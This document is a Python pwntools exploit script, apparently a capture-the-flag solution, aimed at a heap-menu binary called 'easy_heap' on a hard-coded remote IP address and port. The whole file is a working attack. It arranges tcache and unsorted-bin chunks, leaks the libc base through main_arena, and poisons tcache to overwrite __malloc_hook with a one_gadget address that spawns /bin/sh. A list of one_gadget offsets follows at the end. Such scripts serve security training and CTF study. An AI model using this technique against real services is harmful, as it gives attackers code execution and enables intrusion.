from pwn import *
from time import sleep

context.arch = 'amd64'
elf = ELF('easy_heap')
lib = ELF('libc64.so')
#lib = ELF('/lib/x86_64-linux-gnu/libc-2.26.so')

r = remote('118.25.150.134',6666)
#r = process('./easy_heap')

def alloc(size,data):
    r.sendlineafter('command?\n> ','1')
    r.sendlineafter('> ',str(size))
    r.sendlineafter('> ',data)
def delete(index):
    r.sendlineafter('command?\n> ','2')
    r.sendlineafter('> ',str(index))
def puts(index):
    r.sendlineafter('command?\n> ','3')
    r.sendlineafter('> ',str(index))

for i in range(10):
    alloc(0xf7,str(i)*8)
sleep(0.1)
delete(9)
delete(8)
delete(7)
delete(6)
delete(5)
delete(3)
delete(1)
delete(4)#ub
delete(2)#ub 0x500
delete(0)#ub
for i in range(10):
    alloc(8,'\x00')
sleep(0.1)
delete(0)
delete(2)
delete(3)
delete(4)
delete(9)#tc
delete(8)#tc
delete(7)#tc
delete(1)

alloc(8,'\x00')
alloc(248,'\x00')
for i in range(5):
    alloc(8,'\x00')
alloc(8,'\x00')

delete(3)
delete(4)
delete(5)
delete(6)
delete(7)
delete(8)
delete(2)

delete(9)#0x600

puts(1)
leak0 = u64(r.recv(6).ljust(8,'\x00'))
libase = leak0 - lib.symbols['main_arena'] - 96#0x3b0c80
log.info('LIBC BASE -> '+str(hex(libase)))
# 1 & 9
for i in range(8):
    alloc(8,str(i)*8)
delete(2)
delete(3)
delete(4)
delete(5)
delete(1)
delete(9)
alloc(8,'AAAAAAA')
alloc(8,'BBBBBBB')
delete(1)
delete(2)
alloc(8,p64(libase+lib.symbols['__malloc_hook']))
alloc(8,'AAAA')
alloc(8,p64(libase+0x4f2c5))
r.interactive()

'''0x4f2c5	execve("/bin/sh", rsp+0x40, environ)
constraints:
  rcx == NULL

0x4f322	execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''
